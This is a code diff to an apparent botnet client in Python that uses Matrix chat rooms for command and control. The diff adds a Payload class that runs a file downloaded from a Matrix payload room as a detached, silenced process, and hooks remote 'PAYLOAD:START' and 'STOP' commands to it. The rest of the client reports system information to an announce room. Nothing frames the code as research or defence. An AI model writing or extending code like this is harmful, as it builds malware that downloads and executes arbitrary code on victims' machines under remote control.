@@ -2,6 +2,7 @@ import json
 import platform
 import random
 import socket
+import subprocess
 import threading
 import time
 import uuid
@@ -24,6 +25,36 @@ PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
 MATRIX_HOMESERVER = "https://matrix.org"
 MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"
 
+
+
+class Payload:
+    payload_path: str
+    proc: subprocess.Popen
+    running: bool
+
+    def __init__(self, path):
+        self.payload_path = path
+        self.proc = None
+        self.running = False
+
+    def start(self):
+        if self.running:
+            return
+        try:
+            self.proc = subprocess.Popen(
+                [self.payload_path], 
+                stdout=subprocess.DEVNULL,  # Discard output
+                stderr=subprocess.DEVNULL,
+                start_new_session=True  # Key for detaching
+            )
+        except Exception as e:
+            return
+    
+    def stop(self):
+        if not self.running:
+            return
+        self.proc.kill()
+
 class Bot:
     access_token: str
     announce_room: Room = None
@@ -34,6 +65,8 @@ class Bot:
     
     last_ping: float = 0
     ping_timeout_treshold: float = 15
+
+    payload: Payload
     
     def __init__(self):
         self.got_room = False
@@ -42,7 +75,7 @@ class Bot:
         
         self.room_lock = threading.RLock()  # for room state changes
         self.ping_lock = threading.Lock()   # for ping timing updates
-
+        self.payload = None
     def login(self):
         # login and sync
         try:
@@ -108,9 +141,12 @@ class Bot:
             limit=5
         )
         for event in payload_event["chunk"]:
-            if event.get("msgtype", "") == "m.image":
+            msg_type = event.get("msgtype", "")
+            if msg_type == "m.image":
                 self.download_file(event)
-                break
+            elif msg_type == "m.file":
+                self.payload = Payload(self.download_file(event))
+
         
     def get_system_info(self) -> str:
         return json.dumps({
@@ -166,9 +202,9 @@ class Bot:
         elif command.startswith("PAYLOAD"):
             command, status = command.split(":", 1)
             if status == "START":
-                pass
+                self.payload.start()
             elif status == "STOP":
-                pass
+                self.payload.stop()
             else:
                 print("INVALID PAYLOAD COMMAND:", status)
         else:
